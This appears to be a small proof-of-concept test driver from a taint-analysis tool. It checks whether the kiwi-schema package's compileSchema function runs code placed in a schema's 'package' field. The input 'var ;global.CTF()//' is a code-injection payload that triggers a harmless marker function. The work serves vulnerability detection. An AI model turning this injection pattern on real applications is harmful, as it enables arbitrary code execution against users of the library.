// JALANGI DRIVER
process.backup_exit = process.exit;
process.exit = function(){console.log("Tried calling process.exit")};
    
var PUT = require('/nodetaint/packageData/kiwi-schema/node_modules/kiwi-schema');
global.CTF = function() {console.log("GLOBAL.CTF HIT")}
try {
	var x0 = {"package":"var ;global.CTF()//"};
new PUT["compileSchema"](x0)();
} catch (e) {
	console.log(e);
}